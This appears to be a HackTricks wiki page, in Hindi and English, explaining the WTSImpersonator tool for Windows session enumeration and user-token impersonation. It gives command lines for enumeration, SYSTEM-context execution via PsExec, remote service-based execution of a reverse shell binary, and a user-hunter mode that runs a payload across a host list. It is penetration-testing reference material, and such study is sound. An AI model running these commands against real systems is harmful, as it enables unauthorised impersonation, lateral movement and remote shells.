# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, by Omri Baso, `\\pipe\LSM_API_service` RPC named pipe के माध्यम से उपलब्ध Windows Terminal Services APIs का उपयोग करके logged-on sessions को enumerate करता है और चुने गए user के token के साथ एक process शुरू करता है। यह local enumeration और execution के साथ-साथ remote service-based workflows को भी support करता है।<sup>[[1]](#references)</sup>

## Core functionality

इसका local execution flow निम्न API sequence का उपयोग करता है:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules और usage

- **Users enumerate करें:** यह tool local या remote host पर sessions enumerate कर सकता है।

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, IP address या hostname specify करें:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Commands execute करें:** `exec` और `exec-remote` modules को service context की आवश्यकता होती है। Microsoft document करता है कि `WTSQueryUserToken` के लिए caller का `LocalSystem` के रूप में `SE_TCB_NAME` privilege के साथ run होना आवश्यक है।<sup>[[2]](#references)</sup>

- Local command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Testing के लिए PsExec एक `LocalSystem` command prompt start कर सकता है:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote command execution:** Remote mode target पर PsExec-जैसे workflow में service create करता है और इसलिए उस service को install और start करने के rights आवश्यक होते हैं।<sup>[[1]](#references)</sup>

- Example:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** `user-hunter` module किसी named user के session के लिए host list को search करता है और supplied program को उस context में execute करने का प्रयास करता है।<sup>[[1]](#references)</sup>
- Usage example:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` function](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
